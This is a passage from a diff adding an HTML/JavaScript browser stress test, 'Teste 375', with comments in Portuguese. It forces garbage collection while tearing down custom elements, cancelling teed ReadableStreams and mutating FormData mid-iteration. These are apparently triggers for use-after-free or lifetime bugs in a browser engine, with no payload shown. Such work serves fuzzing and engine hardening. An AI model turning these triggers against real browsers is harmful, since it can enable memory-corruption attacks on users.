+          disconnectedCallback(){ gc(); }
+        });
+      } catch(e){}
+      gc();
+      for(let el of wcEls){ try { area.removeChild(el); gc(); } catch(e){} }
+      gcHeavy();
+    } catch(e){}
+
+    // === FASE 4: ReadableStream tee + cancel ===
+    try {
+      let ctrl375;
+      const rs375 = new ReadableStream({
+        start: function(c){ ctrl375 = c; },
+        pull:  function(c){ gc(); c.enqueue(new Uint8Array(512)); },
+        cancel: function(){ gc(); }
+      });
+      const [b1, b2] = rs375.tee();
+      gc();
+      const r1 = b1.getReader(); const r2 = b2.getReader();
+      r1.read().then(function(){ gc(); r1.cancel('phase4'); }).catch(function(){ gc(); });
+      r2.cancel('phase4_immediate');
+      gc();
+      try { ctrl375.close(); } catch(e){}
+      gcHeavy();
+    } catch(e){}
+
+    // === FASE 5: FormData mutação durante forEach ===
+    try {
+      const fd375 = new FormData();
+      for(let i = 0; i < 50; i++) fd375.append('k' + i, 'v' + i);
+      let fdN = 0;
+      try {
+        fd375.forEach(function(v, k, form){
+          fdN++;
+          gc();
+          if(fdN === 15) form.delete('k25');
+          if(fdN === 25) form.append('injected', 'stress');
+          if(fdN > 100) return;
+        });
+      } catch(e){}
+      gcHeavy();
+    } catch(e){}
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+    gcHeavy();
+  } catch(e){}
+  log('Teste 375: fim');
+}
+</script>
+</body>
+</html>
